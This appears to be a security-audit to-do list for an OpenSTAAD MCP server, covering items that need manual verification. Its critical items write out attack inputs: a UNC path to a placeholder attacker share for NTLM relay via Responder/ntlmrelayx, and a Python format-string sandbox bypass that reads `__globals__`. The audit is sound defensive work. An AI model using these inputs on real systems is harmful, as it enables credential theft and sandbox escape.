# Validated Todo -- OPENSTAAD-MCP

## Critical (may indicate missed vulnerabilities)
| # | What To Do | How To Do It | Files/Areas | Original Source | Why AI Could Not Do It |
|---|------------|--------------|-------------|-----------------|------------------------|
| 1 | Verify OMCP-005 COM filesystem write capabilities | Start STAAD.Pro, connect MCP server, run `staad.NewSTAADFile("C:\\temp\\test.std", 1, 0)` via execute_code and check if file is created | [/sources/openstaad-mcp/src/openstaad_mcp/sandbox/executor.py](/sources/openstaad-mcp/src/openstaad_mcp/sandbox/executor.py) | reports_1 | Requires running STAAD.Pro instance |
| 2 | Verify OMCP-005 NTLM relay via UNC paths | Set up Responder/ntlmrelayx on a test network, then send `staad.OpenSTAADFile("\\\\attacker\\share\\model.std")` via execute_code | [/sources/openstaad-mcp/src/openstaad_mcp/sandbox/executor.py](/sources/openstaad-mcp/src/openstaad_mcp/sandbox/executor.py) | reports_1 | No STAAD.Pro runtime + requires network test setup |
| 3 | Verify OMCP-001 format string bypass produces usable output | Run `execute_code` with `"{0.__class__.__init__.__globals__}".format(staad)` against a live STAAD.Pro connection to confirm what internal state is disclosed | [/sources/openstaad-mcp/src/openstaad_mcp/sandbox/ast.py](/sources/openstaad-mcp/src/openstaad_mcp/sandbox/ast.py) | reports_1, reports_2 | Requires running STAAD.Pro instance for real COM object |

## Handoff Items (require manual action)
| # | What To Do | How To Do It | Files/Areas | Original Source | Why AI Could Not Do It |
|---|------------|--------------|-------------|-----------------|------------------------|
| 1 | Verify OMCP-004 executor deadlock | Start MCP server, trigger a long-running COM operation that exceeds 120s timeout, then try another execute_code call | [/sources/openstaad-mcp/src/openstaad_mcp/sandbox/executor.py](/sources/openstaad-mcp/src/openstaad_mcp/sandbox/executor.py) | reports_1 | Requires running STAAD.Pro instance and timing-sensitive test |
| 2 | Verify FastMCP TransportSecurityMiddleware DNS rebinding protection | Start server with `--transport http`, make cross-origin requests from a browser to http://127.0.0.1:18120 and check if Host/Origin headers are validated by the SDK | [/sources/openstaad-mcp/src/openstaad_mcp/main.py](/sources/openstaad-mcp/src/openstaad_mcp/main.py) | reports_2 | Requires running server instance and browser testing |
| 3 | Check resolved dependency versions for CVEs | Run `pip install -e .` and check `pip freeze` output against known CVE databases, especially Starlette/python-multipart versions pulled by fastmcp | [/sources/openstaad-mcp/pyproject.toml](/sources/openstaad-mcp/pyproject.toml) | reports_1 | Requires package installation and CVE database access |
| 4 | Verify STAAD.Pro COM API for dangerous methods | Check if the OpenSTAAD COM API exposes methods for file I/O, macro execution, or OS command execution (e.g., `RunMacro`, `RunCommand`, `ExecuteVBA`) beyond those documented in bundled skills | STAAD.Pro COM API documentation | reports_2 | Requires access to STAAD.Pro API documentation or a running instance |

## Deferred Analysis (need further investigation)
| # | Suspected Issue | What To Do | How To Do It | Files/Areas | Original Source | Blocker |
|---|-----------------|------------|--------------|-------------|-----------------|---------|
| 1 | FastMCP SDK security middleware behavior | Confirm that FastMCP >=3.2.3 provides Sec-Fetch-Site and Host/Origin validation for HTTP transport | Read FastMCP source code or documentation for `TransportSecurityMiddleware` | [/sources/openstaad-mcp/pyproject.toml](/sources/openstaad-mcp/pyproject.toml) | reports_2 | Cannot inspect FastMCP SDK source at audit time |
| 2 | Compile AST directly instead of ast.unparse() round-trip | Consider replacing `ast.unparse()` in `capture_last_expr()` with direct `compile(tree, ...)` to eliminate the validate-then-rewrite gap | Modify `capture_last_expr()` to return compiled code object instead of string | [/sources/openstaad-mcp/src/openstaad_mcp/sandbox/ast.py](/sources/openstaad-mcp/src/openstaad_mcp/sandbox/ast.py) | reports_1 (OMCP-011 removed as FP but improvement remains valid) | Code change recommendation, not a vulnerability |

## Removed During Validation
| # | Task | Reason |
|---|------|--------|
| 1 | N/A | No todo items were removed; OMCP-011 (FP) had no dedicated todo item. The `ast.unparse()` improvement suggestion was preserved as Deferred Analysis #2. |
